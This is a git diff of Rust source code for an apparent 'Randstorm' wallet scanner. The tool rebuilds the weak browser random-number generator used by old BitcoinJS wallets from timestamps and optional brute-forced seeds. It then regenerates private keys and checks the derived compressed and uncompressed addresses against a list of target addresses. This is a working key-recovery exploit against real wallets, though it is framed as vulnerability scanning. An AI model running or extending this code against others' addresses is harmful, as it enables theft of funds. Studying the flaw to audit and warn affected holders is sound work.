@@ -29,7 +29,7 @@
 use super::fingerprints::Phase;
 use super::integration::RandstormScanner;
 use super::prng::bitcoinjs_v013::BitcoinJsV013Prng;
-use super::prng::PrngEngine;
+use super::prng::MathRandomEngine;
 use anyhow::{Context, Result};
 use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
 use bitcoin::Address;
@@ -52,6 +52,10 @@ pub fn run_scan(
     force_gpu: bool,
     force_cpu: bool,
     output_path: Option<&Path>,
+    math_random_engine: &str,
+    seed_override: Option<u64>,
+    seed_bruteforce_bits: Option<u8>,
+    include_uncompressed: bool,
 ) -> Result<()> {
     // Parse scan mode
     let scan_mode = match mode.to_lowercase().as_str() {
@@ -59,13 +63,13 @@ pub fn run_scan(
         "standard" => super::config::ScanMode::Standard,
         "deep" => super::config::ScanMode::Deep,
         "exhaustive" => super::config::ScanMode::Exhaustive,
-        _ => anyhow::bail!("Invalid mode: {}. Must be quick, standard, deep, or exhaustive", mode),
+        _ => anyhow::bail!(
+            "Invalid mode: {}. Must be quick, standard, deep, or exhaustive",
+            mode
+        ),
     };
 
     info!("🔍 Scan mode: {:?}", scan_mode);
-    
-    // TODO: Use scan_mode with StreamingScan in future implementation
-    // For now, mode is validated but StreamingScan integration pending
 
     // Parse phase
     let phase = match phase {
@@ -98,10 +102,21 @@ pub fn run_scan(
 
     // Mode selection: direct sweep if timestamps provided, else phase-based scanner.
     if let (Some(start), Some(end)) = (start_ms, end_ms) {
-        direct_sweep_scan(&addresses, start, end, interval_ms, output_path)?;
+        direct_sweep_scan(
+            &addresses,
+            start,
+            end,
+            interval_ms,
+            output_path,
+            math_random_engine,
+            seed_override,
+            seed_bruteforce_bits,
+            include_uncompressed,
+        )?;
     } else {
         // Initialize scanner with GPU/CPU preference
         let mut config = super::config::ScanConfig::default();
+        config.scan_mode = scan_mode;
         config.use_gpu = if force_cpu {
             false
         } else if force_gpu {
@@ -110,7 +125,9 @@ pub fn run_scan(
             true // default prefers GPU when available
         };
 
-        let mut scanner = RandstormScanner::with_config(config)?;
+        let engine =
+            MathRandomEngine::from_str(math_random_engine).unwrap_or(MathRandomEngine::V8Mwc1616);
+        let mut scanner = RandstormScanner::with_config(config, engine)?;
 
         // Create progress bar
         let pb = ProgressBar::new(addresses.len() as u64);
@@ -230,6 +247,10 @@ fn direct_sweep_scan(
     end_ms: u64,
     interval_ms: u64,
     output_path: Option<&Path>,
+    engine_name: &str,
+    seed_override: Option<u64>,
+    seed_bruteforce_bits: Option<u8>,
+    include_uncompressed: bool,
 ) -> Result<()> {
     if interval_ms == 0 {
         anyhow::bail!("interval_ms must be > 0");
@@ -264,6 +285,22 @@ fn direct_sweep_scan(
         anyhow::bail!("No valid P2PKH/P2SH addresses to scan");
     }
 
+    let engine = MathRandomEngine::from_str(engine_name).ok_or_else(|| {
+        anyhow::anyhow!(
+            "Invalid engine: {} (use v8, drand48, java, or xorshift128plus/spidermonkey/jsc)",
+            engine_name
+        )
+    })?;
+
+    if let Some(bits) = seed_bruteforce_bits {
+        if bits > 28 {
+            anyhow::bail!(
+                "seed_bruteforce_bits too large ({}). Please use <=28 to avoid runaway scans.",
+                bits
+            );
+        }
+    }
+
     let secp = Secp256k1::new();
     let mut matches = Vec::new();
 
@@ -278,42 +315,60 @@ fn direct_sweep_scan(
     );
 
     while ts <= end_ms {
-        // Reconstruct vulnerable RNG
-        let prng = BitcoinJsV013Prng::new();
-        let seed = super::prng::SeedComponents {
-            timestamp_ms: ts,
-            user_agent: String::new(),
-            screen_width: 0,
-            screen_height: 0,
-            color_depth: 0,
-            timezone_offset: 0,
-            language: String::new(),
-            platform: String::new(),
+        let base_seed = seed_override.unwrap_or(ts);
+        let (mut offset, max_offset) = if let Some(bits) = seed_bruteforce_bits {
+            let max = 1u64.checked_shl(bits as u32).unwrap_or(0);
+            (0u64, max)
+        } else {
+            (0u64, 1u64)
         };
-        let state = prng.generate_state(&seed);
-        let key_bytes = prng.generate_bytes(&state, 32);
 
-        if let Ok(secret_key) = SecretKey::from_slice(&key_bytes) {
-            let public_key = PublicKey::from_secret_key(&secp, &secret_key);
-            let addr = super::derivation::derive_p2pkh_address(&public_key);
+        while offset < max_offset {
+            let seed = base_seed.wrapping_add(offset);
+            let key_bytes = BitcoinJsV013Prng::generate_privkey_bytes(ts, engine, Some(seed));
 
-            // Compare hash160; skip invalid parses instead of aborting the scan
-            if let Ok(parsed) = Address::from_str(&addr) {
-                let script = parsed.assume_checked().script_pubkey();
-                let hash = if script.is_p2pkh() {
-                    script.as_bytes()[3..23].to_vec()
-                } else if script.is_p2sh() {
-                    script.as_bytes()[2..22].to_vec()
-                } else {
-                    Vec::new()
-                };
+            if let Ok(secret_key) = SecretKey::from_slice(&key_bytes) {
+                let public_key = PublicKey::from_secret_key(&secp, &secret_key);
 
-                if target_set.contains(&hash) {
-                    matches.push((ts, addr));
+                // compressed
+                let addr_comp = super::derivation::derive_p2pkh_address(&public_key);
+                let mut found = false;
+                if let Ok(parsed) = Address::from_str(&addr_comp) {
+                    let script = parsed.assume_checked().script_pubkey();
+                    let hash = if script.is_p2pkh() {
+                        script.as_bytes()[3..23].to_vec()
+                    } else if script.is_p2sh() {
+                        script.as_bytes()[2..22].to_vec()
+                    } else {
+                        Vec::new()
+                    };
+
+                    if target_set.contains(&hash) {
+                        matches.push((ts, addr_comp.clone()));
+                        found = true;
+                    }
                 }
-            } else {
-                warn!("Skipping unparsable address at ts {}: {}", ts, addr);
+
+                // uncompressed path
+                if include_uncompressed && !found {
+                    let addr_uncomp =
+                        super::derivation::derive_p2pkh_address_uncompressed(&public_key);
+                    if let Ok(parsed) = Address::from_str(&addr_uncomp) {
+                        let script = parsed.assume_checked().script_pubkey();
+                        let hash = if script.is_p2pkh() {
+                            script.as_bytes()[3..23].to_vec()
+                        } else if script.is_p2sh() {
+                            script.as_bytes()[2..22].to_vec()
+                        } else {
+                            Vec::new()
+                        };
+                        if target_set.contains(&hash) {
+                            matches.push((ts, addr_uncomp));
+                        }
+                    }
+                }
             }
+            offset = offset.saturating_add(1);
         }
 
         ts = ts.saturating_add(interval_ms);
@@ -405,9 +460,9 @@ mod tests {
     fn test_load_addresses_comments_and_empty() {
         let mut temp_file = NamedTempFile::new().unwrap();
         writeln!(temp_file, "# Comment line").unwrap();
-        writeln!(temp_file, "").unwrap();
+        writeln!(temp_file).unwrap();
         writeln!(temp_file, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa").unwrap();
-        writeln!(temp_file, "").unwrap();
+        writeln!(temp_file).unwrap();
         writeln!(temp_file, "# Another comment").unwrap();
         writeln!(temp_file, "12cbQLTFMXRnSzktFkuoG3eHoMeFtpTu3S").unwrap();
         temp_file.flush().unwrap();
@@ -460,11 +515,12 @@ mod tests {
         use super::super::integration::{Confidence, VulnerabilityFinding};
         let results: Vec<VulnerabilityFinding> = vec![];
         let mut output = Vec::new();
-        
+
         output_results_to_writer(&results, &mut output).unwrap();
         let output_str = String::from_utf8(output).unwrap();
-        
-        assert!(output_str.starts_with("Address,Status,Confidence,BrowserConfig,Timestamp,DerivationPath"));
+
+        assert!(output_str
+            .starts_with("Address,Status,Confidence,BrowserConfig,Timestamp,DerivationPath"));
     }
 
     // TEST-ID: 1.8.1-UNIT-007
@@ -474,7 +530,7 @@ mod tests {
     fn test_output_results_single_finding() {
         use super::super::fingerprints::BrowserConfig;
         use super::super::integration::{Confidence, VulnerabilityFinding};
-        
+
         let finding = VulnerabilityFinding {
             address: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa".to_string(),
             confidence: Confidence::High,
@@ -488,11 +544,11 @@ mod tests {
             timestamp: 1365000000000,
             derivation_path: "m/0'/0/0".to_string(),
         };
-        
+
         let mut output = Vec::new();
         output_results_to_writer(&[finding], &mut output).unwrap();
         let output_str = String::from_utf8(output).unwrap();
-        
+
         assert!(output_str.contains("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"));
         assert!(output_str.contains("VULNERABLE"));
         assert!(output_str.contains("HIGH"));
@@ -506,7 +562,7 @@ mod tests {
     fn test_output_results_multiple_findings() {
         use super::super::fingerprints::BrowserConfig;
         use super::super::integration::{Confidence, VulnerabilityFinding};
-        
+
         let findings = vec![
             VulnerabilityFinding {
                 address: "1Address1".to_string(),
@@ -523,11 +579,11 @@ mod tests {
                 derivation_path: "m/0'/0/1".to_string(),
             },
         ];
-        
+
         let mut output = Vec::new();
         output_results_to_writer(&findings, &mut output).unwrap();
         let output_str = String::from_utf8(output).unwrap();
-        
+
         let lines: Vec<&str> = output_str.lines().collect();
         assert_eq!(lines.len(), 3); // header + 2 findings
         assert!(output_str.contains("1Address1"));
@@ -542,10 +598,10 @@ mod tests {
         use super::super::integration::VulnerabilityFinding;
         let results: Vec<VulnerabilityFinding> = vec![];
         let mut output = Vec::new();
-        
+
         output_results_to_writer(&results, &mut output).unwrap();
         let output_str = String::from_utf8(output).unwrap();
-        
+
         let lines: Vec<&str> = output_str.lines().collect();
         assert_eq!(lines.len(), 1); // header only
     }
@@ -588,7 +644,7 @@ mod tests {
     #[test]
     fn test_cli_mode_flag() {
         use super::super::config::ScanMode;
-        
+
         // Verify ScanMode variants are accessible
         assert_eq!(ScanMode::Quick.interval_ms(), 126_000_000);
         assert_eq!(ScanMode::Standard.interval_ms(), 3_600_000);
@@ -596,4 +652,3 @@ mod tests {
         assert_eq!(ScanMode::Exhaustive.interval_ms(), 1_000);
     }
 }
-
